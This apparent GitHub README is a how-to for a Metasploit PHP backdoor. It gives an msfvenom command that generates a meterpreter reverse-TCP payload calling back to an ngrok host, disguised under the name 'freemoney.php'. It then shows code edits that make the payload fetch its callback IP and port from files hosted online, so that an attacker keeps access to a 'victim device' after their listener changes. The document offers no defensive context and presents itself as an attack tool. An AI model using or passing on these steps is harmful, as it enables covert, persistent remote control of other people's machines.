# <img src="https://img.icons8.com/cute-clipart/48/000000/double-tick.png"/> METASPLOIT PHP BACKDOOR

<a href="https://github.com/isuruwa"><img title="addon" src="https://img.shields.io/badge/isuruwa-MSFPHPBACKDOOR-brightgreen?style=for-the-badge&logo=appveyor"></a>
<br>
  
![backdoor](https://user-images.githubusercontent.com/72663288/124308859-80a07780-db87-11eb-9a36-7095feb3102f.jpg)

<p align="center">
<img align="center" alt="visitors" src="https://visitor-badge.glitch.me/badge?page_id=isuruwaphpbackdoor" />
<br>
<a href="https://github.com/isuruwa"><img title="addon" src="https://img.shields.io/badge/isuruwa-MSFPHPBACKDOOR-blueviolet?style=for-the-badge&logo=appveyor"></a>
<br>
<a href="https://hits.seeyoufarm.com"><img src="https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2Fisuruwa&count_bg=%2379C83D&title_bg=%23555555&icon=&icon_color=%23E7E7E7&title=hits&edge_flat=false"/></a>
</p>


# <img src="https://img.icons8.com/cute-clipart/48/000000/double-tick.png"/> create your php payload with  Metasploit : <img src="https://img.icons8.com/emoji/48/000000/man-technologyst.png"/>

ex - msfvenom -p php/meterpreter/reverse_tcp lhost=0.tcp.ngrok.io lport=ngrokport R> freemoney.php 

After creating payload php , open it in a editor .
Then you will find something like 

 * Default metasploit payload 'php/meterpreter/reverse_tcp'
 * $ip = 0.tcp.ngrok.io;
 * $port = xxxx;

# <img src="https://img.icons8.com/cute-clipart/48/000000/double-tick.png"/> Replace these above $ip , $port lines with these . : <img src="https://img.icons8.com/emoji/48/000000/man-technologyst.png"/>

$ip = file_get_contents("uploadedurl/ip.txt");

$port = file_get_contents("uploadedurl/port.txt");

# <img src="https://img.icons8.com/cute-clipart/48/000000/double-tick.png"/> Your Text Files Must be contain : <img src="https://img.icons8.com/emoji/48/000000/man-technologyst.png"/>

* `ip.txt (contains "0.tcp.ngrok.io")`
* `port.txt (contains "port")`

and upload them to a hosting or online storage .

# <img src="https://img.icons8.com/cute-clipart/48/000000/double-tick.png"/> Why we use file_get_contents? : <img src="https://img.icons8.com/emoji/48/000000/man-technologyst.png"/>

Think , we installed our payload in victim device but it is not listening . That may be a port forwarding or a other problem . Now we can't change our port or ip to start a new listening in same payload .

# <img src="https://img.icons8.com/cute-clipart/48/000000/double-tick.png"/> Here is the Solution : <img src="https://img.icons8.com/emoji/48/000000/man-technologyst.png"/>

With the file_get_contents it reads the new contents of the file we uploaded . so only thing we need to do is changing the host & port. Then payload will start relistening according to your new data .Then we can get our session back what ever the problem . 

  
<br>

<img src="https://img.shields.io/badge/isuruwa-Thank%20You-brightgreen?style=social&logo=appveyor"/>

<img src="https://img.shields.io/badge/isuruwa-STAY%20SAFE-brightgreen?style=flat-square&logo=appveyor"/>

<img src="https://img.shields.io/badge/isuruwa-EXPECT%20US-red?style=for-the-badge&logo=appveyor"/>

